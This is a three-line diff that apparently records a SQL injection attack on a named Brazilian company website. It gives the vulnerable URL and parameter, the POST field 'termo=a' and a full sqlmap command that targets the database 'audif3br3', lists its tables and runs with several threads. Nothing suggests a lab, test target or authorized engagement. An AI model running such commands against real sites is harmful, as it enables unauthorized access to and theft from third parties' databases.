@@ -1,0 +1,3 @@
+http://www.audifactor.com.br/servicos?id=9 (POST)  # sqlmap.py -u http://www.audifactor.com.br/servicos?id=9 --data termo=a -D audif3br3 --table --threads 5 -v3
+
+termo=a
